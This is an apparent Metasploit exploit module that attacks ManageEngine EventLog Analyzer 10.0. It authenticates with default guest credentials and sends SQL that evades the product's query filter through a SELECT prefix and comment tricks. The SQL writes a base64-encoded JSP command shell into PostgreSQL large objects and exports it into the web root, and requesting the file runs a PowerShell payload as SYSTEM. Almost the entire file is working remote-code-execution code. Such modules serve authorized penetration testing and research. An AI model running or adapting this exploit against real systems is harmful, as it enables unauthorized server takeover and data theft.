# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Powershell
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ManageEngine EventLog Analyzer Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a SQL query functionality in ManageEngine EventLog Analyzer v10.6
        account can execute SQL queries directly on the underlying Postgres database server. The
        queries are executed as the "postgres" user which has full privileges and thus is able to
        write files to disk. This way a JSP payload can be uploaded and executed with SYSTEM
        privileges on the web server. This module has been tested successfully on ManageEngine
        EventLog Analyzer 10.0 (build 10003) over Windows 7 SP1.
       },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;xistence <xistence[at]0x90.nl>&#039; # Discovery, Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;38173&#039;]
        ],
      &#039;Platform&#039;       => [&#039;win&#039;],
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Targets&#039;        =>
        [
          [&#039;ManageEngine EventLog Analyzer 10.0 (build 10003) / Windows 7 SP1&#039;, {}]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jul 11 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          Opt::RPORT(8400),
          OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to authenticate as&#039;, &#039;guest&#039; ]),
          OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password to authenticate as&#039;, &#039;guest&#039; ])
        ], self.class)
 end
 
  def uri
    target_uri.path
  end
 
 
  def check
    # Check version
    vprint_status("#{peer} - Trying to detect ManageEngine EventLog Analyzer")
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;event&#039;, &#039;index3.do&#039;)
    })
 
    if res && res.code == 200 && res.body && res.body.include?(&#039;ManageEngine EventLog Analyzer&#039;)
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def sql_query(cookies, query)
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;event&#039;, &#039;runQuery.do&#039;),
      &#039;cookie&#039; => cookies,
      &#039;vars_post&#039; => {
        &#039;execute&#039; => &#039;true&#039;,
        &#039;query&#039; => query,
      }
    })
 
    unless res && res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Failed executing SQL query!")
    end
 
    res
  end
 
 
  def generate_jsp_payload(cmd)
 
    decoder = rand_text_alpha(4 + rand(32 - 4))
    decoded_bytes = rand_text_alpha(4 + rand(32 - 4))
    cmd_array = rand_text_alpha(4 + rand(32 - 4))
    jsp_code = &#039;<%&#039;
    jsp_code <<  "sun.misc.BASE64Decoder #{decoder} = new sun.misc.BASE64Decoder();\n"
    jsp_code << "byte[] #{decoded_bytes} = #{decoder}.decodeBuffer(\"#{Rex::Text.encode_base64(cmd)}\");\n"
    jsp_code << "String [] #{cmd_array} = new String[3];\n"
    jsp_code << "#{cmd_array}[0] = \"cmd.exe\";\n"
    jsp_code << "#{cmd_array}[1] = \"/c\";\n"
    jsp_code << "#{cmd_array}[2] = new String(#{decoded_bytes}, \"UTF-8\");\n"
    jsp_code << "Runtime.getRuntime().exec(#{cmd_array});\n"
    jsp_code << &#039;%>&#039;
 
    jsp_code
  end
 
 
  def exploit
 
    print_status("#{peer} - Retrieving JSESSION ID")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;event&#039;, &#039;index3.do&#039;),
    })
 
    if res && res.code == 200 && res.get_cookies =~ /JSESSIONID=(\w+);/
      jsessionid = $1
      print_status("#{peer} - JSESSION ID Retrieved [ #{jsessionid} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to retrieve JSESSION ID!")
    end
 
    print_status("#{peer} - Access login page")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;event&#039;, "j_security_check;jsessionid=#{jsessionid}"),
      &#039;vars_post&#039; => {
        &#039;forChecking&#039; => &#039;null&#039;,
        &#039;j_username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;j_password&#039; => datastore[&#039;PASSWORD&#039;],
        &#039;domains&#039; => "Local Authentication\r\n",
        &#039;loginButton&#039; => &#039;Login&#039;,
        &#039;optionValue&#039; => &#039;hide&#039;
      }
    })
 
    if res && res.code == 302
      redirect =  URI(res.headers[&#039;Location&#039;])
      print_status("#{peer} - Location is [ #{redirect} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Access to login page failed!")
    end
 
 
    # Follow redirection process
    print_status("#{peer} - Following redirection")
    res = send_request_cgi({
      &#039;uri&#039; => "#{redirect}",
      &#039;method&#039; => &#039;GET&#039;
    })
 
    if res && res.code == 200 && res.get_cookies =~ /JSESSIONID/
      cookies = res.get_cookies
      print_status("#{peer} - Logged in, new cookies retrieved [#{cookies}]")
    else
      fail_with(Failure::Unknown, "#{peer} - Redirect failed, unable to login with provided credentials!")
    end
 
 
    jsp_name = rand_text_alphanumeric(4 + rand(32 - 4)) + &#039;.jsp&#039;
 
    cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
    jsp_payload = Rex::Text.encode_base64(generate_jsp_payload(cmd)).gsub(/\n/, &#039;&#039;)
 
 
    print_status("#{peer} - Executing SQL queries")
 
    sql = &#039;SELECT lo_unlink(-1)&#039;
    result = sql_query(cookies, sql)
 
    # Create large object "-1". We use "-1" so we will not accidently overwrite large objects in use by other tasks.
    sql = &#039;SELECT lo_create(-1)&#039;
    result = sql_query(cookies, sql)
    if result.body =~ /menuItemRow\">([0-9]+)/
      loid = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Postgres Large Object ID not found!")
    end
 
    select_random = rand_text_numeric(2 + rand(6 - 2))
    # Insert JSP payload into the pg_largeobject table. We have to use "SELECT" first to to bypass OpManager&#039;s checks for queries starting with INSERT/UPDATE/DELETE, etc.
    sql = "SELECT #{select_random};INSERT INTO/**/pg_largeobject/**/(loid,pageno,data)/**/VALUES(#{loid}, 0, DECODE(&#039;#{jsp_payload}&#039;, &#039;base64&#039;));--"
 
 
    result = sql_query(cookies, sql)
 
    # Export our large object id data into a WAR file
    sql = "SELECT lo_export(#{loid}, &#039;..//..//webapps//event/#{jsp_name}&#039;);"
 
    sql_query(cookies, sql)
 
    # Remove our large object in the database
    sql = &#039;SELECT lo_unlink(-1)&#039;
    result = sql_query(cookies, sql)
 
    register_file_for_cleanup("..\\webapps\\event\\#{jsp_name}")
 
    print_status("#{peer} - Executing JSP payload")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, jsp_name),
    })
 
    # If the server returns 200 we assume we uploaded and executed the payload file successfully
    unless res && res.code == 200
      print_status("#{res.code}\n#{res.body}")
      fail_with(Failure::Unknown, "#{peer} - Payload not executed, aborting!")
    end
 
  end
 
end

